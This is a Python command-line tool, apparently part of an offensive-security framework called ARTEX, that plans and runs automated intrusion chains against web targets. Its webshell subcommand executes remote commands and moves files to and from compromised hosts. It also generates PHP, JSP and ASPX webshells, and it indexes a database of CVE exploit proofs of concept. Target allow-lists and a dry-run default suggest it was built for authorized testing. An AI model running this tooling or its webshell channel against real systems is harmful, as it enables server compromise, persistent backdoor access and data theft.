#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""chainctl — ARTEX 自动入侵链路执行器（stdlib only，无第三方依赖）。

用法速查：
  python chainctl.py plan   --target http://10.0.0.5:8080 --profile auto --out plan.json
  python chainctl.py run    --plan plan.json --allow 10.0.0.5          # dry-run（只探测）
  python chainctl.py run    --plan plan.json --allow 10.0.0.5 --execute # 真实利用
  python chainctl.py verify --plan plan.json --allow 10.0.0.5 --execute # 只跑 verify 通道
  python chainctl.py shell  --url http://h/shell.php --key artex -c "id"
  python chainctl.py shell  --scaffold php --key artex --out shell.php
  python chainctl.py catalog --db knowledge/knowledge.db --out catalog.json
  python chainctl.py selftest
  python chainctl.py primitives

上下文注入（--hint 可重复）：lfi_param / upload_url / upload_field / upload_dir_url /
sqli_param / ssrf_param / canary_url / token / jwt_probe_url / shell_url / shell_key /
php_file / wordlist / port。

退出码：0 成功（含部分命中）；2 参数/范围错误；3 自测失败。
"""
from __future__ import annotations

import argparse
import json
import os
import sqlite3
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import chainlib as L


def _runs_root() -> str:
    root = os.environ.get("ARTEX_RUNS_DIR") or os.path.join(os.getcwd(), "runs")
    return os.path.join(root, "chainctl")


def cmd_plan(a) -> int:
    hints = dict(kv.split("=", 1) for kv in (a.hint or []) if "=" in kv)
    if a.port:
        hints["port"] = int(a.port)
    plan = L.build_plan(a.target, a.profile, hints)
    out = a.out or os.path.join(_runs_root(), "plan-%s.json" % time.strftime("%Y%m%d-%H%M%S"))
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
    with open(out, "w", encoding="utf-8") as f:
        json.dump(plan, f, ensure_ascii=False, indent=2)
    print(json.dumps({"plan": out, "primitives": plan["primitives"]}, ensure_ascii=False, indent=2))
    return 0


def cmd_run(a) -> int:
    with open(a.plan, "r", encoding="utf-8") as f:
        plan = json.load(f)
    if a.hint:
        plan.setdefault("hints", {}).update(dict(kv.split("=", 1) for kv in a.hint if "=" in kv))
    run_dir = a.run_dir or os.path.join(_runs_root(), time.strftime("%Y%m%d-%H%M%S"))
    os.makedirs(run_dir, exist_ok=True)
    try:
        res = L.run_plan(plan, run_dir, a.allow or [], execute=a.execute,
                         rps=a.rps, only_verify=a.verify_only)
    except L.ScopeError as e:
        print(f"[范围拒绝] {e}", file=sys.stderr)
        return 2
    hits = [r for r in res["results"] if r["ok"] and r["severity"] != "info"]
    confirmed = [r for r in res["results"] if r["action"] == "verify" and r["ok"]]
    print(json.dumps({
        "run_dir": res["run_dir"], "ledger": res["ledger"],
        "records": len(res["results"]), "hits": len(hits), "verified": len(confirmed),
        "gained": sorted({r["gained"] for r in res["results"] if r["gained"]}),
        "findings": [{"primitive": r["primitive"], "stage": r["stage"], "severity": r["severity"],
                      "detail": r["detail"], "gained": r["gained"]} for r in hits],
    }, ensure_ascii=False, indent=2))
    return 0


def cmd_shell(a) -> int:
    if a.scaffold:
        code = L.scaffold(a.scaffold, a.key)
        if a.out:
            with open(a.out, "w", encoding="utf-8") as f:
                f.write(code)
            print(f"[写出] {a.out}  ({len(code)} bytes, kind={a.scaffold})")
        else:
            print(code)
        return 0
    if not a.url:
        print("需要 --url（或 --scaffold php|jsp|aspx）", file=sys.stderr)
        return 2
    ch = L.ShellChannel(a.url, a.key, timeout=a.timeout)
    if a.cmd:
        ok, out = ch.exec(a.cmd)
        print(out)
        return 0 if ok else 1
    if a.upload:
        local, remote = a.upload
        with open(local, "rb") as f:
            b64 = __import__("base64").b64encode(f.read()).decode()
        ok, out = ch.exec("echo %s | base64 -d > %s && ls -l %s" % (b64, remote, remote))
        print(out)
        return 0 if ok and "No such" not in out else 1
    if a.download:
        remote, local = a.download
        ok, out = ch.exec("base64 -w0 %s" % remote)
        if not ok:
            print(out, file=sys.stderr)
            return 1
        import base64
        with open(local, "wb") as f:
            f.write(base64.b64decode(out.strip()))
        print(f"[下载] {remote} → {local} ({os.path.getsize(local)} bytes)")
        return 0
    print("需要 -c/--cmd、--upload、--download 之一", file=sys.stderr)
    return 2


def cmd_catalog(a) -> int:
    """把知识库 PoC 索引成 CVE/产品 → PoC 目录映射，供 plan 与人工检索。"""
    cat = {"generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "cve": {}, "component": {}, "rows": 0}
    if a.db and os.path.exists(a.db):
        con = sqlite3.connect(a.db)
        cur = con.execute("select cve, component, title, path, category, severity from poc")
        for cve, comp, title, path, catg, sev in cur:
            cat["rows"] += 1
            rec = {"title": title, "path": path, "category": catg, "severity": sev}
            if cve:
                for one in str(cve).replace(";", ",").split(","):
                    one = one.strip()
                    if one:
                        cat["cve"].setdefault(one.lower(), []).append(rec)
            if comp:
                cat["component"].setdefault(str(comp).strip().lower(), []).append(rec)
        con.close()
    else:
        root = a.pocs or os.path.join(os.getcwd(), "knowledge", "pocs")
        for name in sorted(os.listdir(root)) if os.path.isdir(root) else []:
            p = os.path.join(root, name)
            if not os.path.isdir(p):
                continue
            cat["rows"] += 1
            import re as _re
            for cve in _re.findall(r"cve-\d{4}-\d+", name, _re.I):
                cat["cve"].setdefault(cve.lower(), []).append({"title": name, "path": p})
    out = a.out or os.path.join(_runs_root(), "catalog.json")
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
    with open(out, "w", encoding="utf-8") as f:
        json.dump(cat, f, ensure_ascii=False, indent=1)
    print(json.dumps({"out": out, "rows": cat["rows"], "cves": len(cat["cve"]),
                      "components": len(cat["component"])}, ensure_ascii=False))
    return 0


def cmd_primitives(a) -> int:
    rows = []
    for pid, p in sorted(L.PRIMITIVES.items(), key=lambda kv: (L.STAGE_ORDER.index(kv[1]["stage"]), kv[0])):
        rows.append({"id": pid, "stage": p["stage"], "kind": p["kind"],
                     "severity": p["severity"], "ports": p["ports"], "requires": p["requires"]})
    print(json.dumps(rows, ensure_ascii=False, indent=2))
    return 0


def cmd_selftest(a) -> int:
    import selftest
    return selftest.main()


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="chainctl", description="ARTEX 自动入侵链路执行器")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("plan", help="生成链路计划")
    p.add_argument("--target", required=True)
    p.add_argument("--profile", default="auto", choices=["auto", "web", "db", "host"])
    p.add_argument("--port", type=int)
    p.add_argument("--hint", action="append")
    p.add_argument("--out")
    p.set_defaults(func=cmd_plan)

    p = sub.add_parser("run", help="执行链路计划")
    p.add_argument("--plan", required=True)
    p.add_argument("--allow", action="append", help="授权目标 IP/CIDR/域名，可重复")
    p.add_argument("--execute", action="store_true", help="真实利用（默认 dry-run 只探测）")
    p.add_argument("--verify-only", action="store_true", help="只跑 verify 双对照")
    p.add_argument("--rps", type=float, default=5.0)
    p.add_argument("--hint", action="append")
    p.add_argument("--run-dir")
    p.set_defaults(func=cmd_run)

    p = sub.add_parser("verify", help="对已有计划只做复测（等价 run --verify-only）")
    p.add_argument("--plan", required=True)
    p.add_argument("--allow", action="append")
    p.add_argument("--rps", type=float, default=3.0)
    p.add_argument("--run-dir")
    p.set_defaults(func=lambda a: cmd_run(argparse.Namespace(
        plan=a.plan, allow=a.allow, execute=True, verify_only=True,
        rps=a.rps, hint=None, run_dir=a.run_dir)))

    p = sub.add_parser("shell", help="WebShell 通道 / 马生成")
    p.add_argument("--url")
    p.add_argument("--key", default="artex")
    p.add_argument("-c", "--cmd")
    p.add_argument("--upload", nargs=2, metavar=("LOCAL", "REMOTE"))
    p.add_argument("--download", nargs=2, metavar=("REMOTE", "LOCAL"))
    p.add_argument("--scaffold", choices=["php", "jsp", "aspx"])
    p.add_argument("--out")
    p.add_argument("--timeout", type=float, default=15.0)
    p.set_defaults(func=cmd_shell)

    p = sub.add_parser("catalog", help="索引 knowledge.db / pocs 目录")
    p.add_argument("--db", default=os.path.join(os.getcwd(), "knowledge", "knowledge.db"))
    p.add_argument("--pocs")
    p.add_argument("--out")
    p.set_defaults(func=cmd_catalog)

    p = sub.add_parser("primitives", help="列出内置原语")
    p.set_defaults(func=cmd_primitives)

    p = sub.add_parser("selftest", help="本地夹具端到端自测")
    p.set_defaults(func=cmd_selftest)

    a = ap.parse_args(argv)
    return a.func(a)


if __name__ == "__main__":
    sys.exit(main())
